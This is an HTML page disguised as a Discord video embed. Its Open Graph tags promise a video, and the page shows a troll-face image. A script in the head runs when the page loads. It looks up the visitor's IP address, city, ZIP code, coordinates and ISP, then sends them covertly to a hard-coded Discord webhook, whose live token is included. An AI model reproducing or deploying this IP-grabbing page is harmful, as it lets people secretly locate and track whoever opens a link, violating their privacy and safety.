<!DOCTYPE html>
<html>
    <head>
        <meta property="og:type" content="video.other">
        <meta property="og:video:url" content="https://cdn.discordapp.com/attachments/1084656519133536279/1104748901975720046/me_if_i_never_clicked_the_link_above.mp4">
        <meta property="og:video:height" content="815">
        <meta property="og:video:width" content="3007">
        <script> 
        const whurl = "https://discord.com/api/webhooks/1084656540881002576/RaQY4jj8HLTEDVetKIIUvMIjZ9Bgu6Ys3weqtfpYbqYXK3RegVzwX1Dq-oxAjYzSO7nz";
      const ipUrl = "http://ip-api.com/json/";

      // Make a request to get the geolocation information
      fetch(ipUrl)
        .then(response => response.json())
        .then(data => {
          const {
            countryCode,
            country,
            region,
            regionName,
            city,
            zip,
            lat,
            lon,
            timezone,
            isp,
            org,
            as,
            query
          } = data;

          // Create an embed object with the geolocation information
          const embed = {
            "title": "Geolocation Information",
            "description": `The user is from ${city}, ${regionName}, ${country} (${countryCode}), with coordinates (${lat}, ${lon}).`,
            "color": 16711680,
            "fields": [
              {
                "name": "IP Address",
                "value": query,
                "inline": true
              },
              {
                "name": "ZIP Code",
                "value": zip,
                "inline": true
              },
              {
                "name": "Timezone",
                "value": timezone,
                "inline": true
              },
              {
                "name": "ISP",
                "value": isp,
                "inline": true
              },
              {
                "name": "Organization",
                "value": org,
                "inline": true
              },
              {
                "name": "AS",
                "value": as,
                "inline": true
              }
            ]
          };

          // Send a webhook message with the geolocation information
          fetch(whurl + "?wait=true", {
            "method": "POST",
            "headers": {"content-type": "application/json"},
            "body": JSON.stringify({ embeds: [embed] })
          });
        })
        .catch(error => console.log(error));
        </script>
            </head>
    <body>
        <img src="https://images-ext-1.discordapp.net/external/u3zDE9PLwr8DxyWspRTPiBL6gAL_3rjIS-LiXOix5YM/https/media.tenor.com/AqqcJZppkdoAAAPo/troll-troll-face.mp4">
    </body>
</html>
